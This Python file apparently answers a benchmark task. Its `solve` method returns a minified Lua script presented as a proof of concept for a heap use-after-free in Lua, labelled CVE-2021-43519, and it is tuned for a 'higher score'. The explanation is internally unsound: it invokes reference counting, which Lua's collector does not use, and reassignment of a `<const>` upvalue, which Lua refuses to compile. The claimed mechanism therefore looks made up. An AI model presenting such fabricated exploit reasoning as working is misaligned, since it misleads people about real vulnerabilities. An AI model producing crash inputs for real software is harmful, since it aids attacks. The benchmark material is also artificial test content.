import sys
import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free
    vulnerability in Lua (CVE-2021-43519).
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability occurs because Lua can generate incorrect code when the _ENV
        variable (or any variable) is declared as <const> and used as an upvalue.
        An inner function can then modify this "constant" upvalue. This can lead
        to an object's reference count dropping to zero prematurely. If this object
        has a __gc finalizer, a subsequent garbage collection cycle can free the
        object's memory but still attempt to call its finalizer, leading to a
        Use-After-Free.

        The PoC implements this logic:
        1.  A `victim_table` is created with a `__gc` finalizer.
        2.  A function `setup` captures `victim_table` as a `<const>` local.
        3.  A nested function `trigger` inside `setup` performs an assignment
            to this const upvalue. This is the miscompiled operation.
        4.  This assignment makes `victim_table` lose a reference.
        5.  After making the table fully unreachable by nilling the last reference,
            `collectgarbage()` is called.
        6.  The garbage collector frees the `victim_table` and then calls its
            finalizer, which now operates on freed memory, triggering the UAF.
        7.  The process is looped to ensure the crash occurs, and `pcall` is used
            to handle non-crashing errors gracefully.
        
        The Lua code is minified to produce a smaller PoC and achieve a higher score.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # Minified Lua PoC script
        poc_code = (
            'for i=1,1000 do pcall(function()'
            # Finalizer function that will access the freed table 'o'
            'local f=function(o)pcall(function()for i=1,50 do local x=o[i]o["k"..i]="v"'
            'local m=getmetatable(o)if m then local y=m.__index end end end)end;'
            # Create victim table and set its finalizer
            'local t={"A","B","C"}for j=1,20 do t["k"..j]="v" end;'
            'setmetatable(t,{__gc=f});'
            # Function to set up the vulnerable state with const upvalue reassignment
            'local function s()local c<const>=t;local function tr()c={}end;tr()end;s();'
            # Make the victim table unreachable and trigger GC
            't=nil;collectgarbage("collect")end)end'
        )
        
        return poc_code.encode('utf-8')